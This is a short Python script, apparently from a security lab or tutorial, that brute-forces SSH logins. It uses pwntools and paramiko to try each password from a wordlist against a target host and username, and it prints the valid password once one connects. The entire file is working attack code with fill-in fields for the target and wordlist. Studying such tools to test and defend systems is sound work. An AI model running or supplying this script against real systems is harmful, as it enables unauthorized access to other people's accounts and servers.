#!/usr/bin/env python3

from pwn import *
import paramiko

# Enter the host ip address you are trying to bruteforce
host = "127.0.0.1"
# Enter the username, if known, else you will have to attempt the same process with a user name wordlist
username = "kali"
attempts = 0

#Enter the file path or the file below
with open("ENTER PASSWORD FILE PATH OR FILE HERE", "r") as password_lists:
	for password in password_lists:
		password = password.strip("\n")
		try:
			print("[{}] Attempting Password: {}".format(attempts, password))
			response = ssh(host=host, user=username, password=password, timeout=1)
			if response.connected():
				print("[>] Valid Password Found: '{}'".format(password))
				response.close()
				break
			response.close()
		except paramiko.ssh_exception.AuthenticationException:
			print("[X] Invalid Password!")
		attempts += 1



			

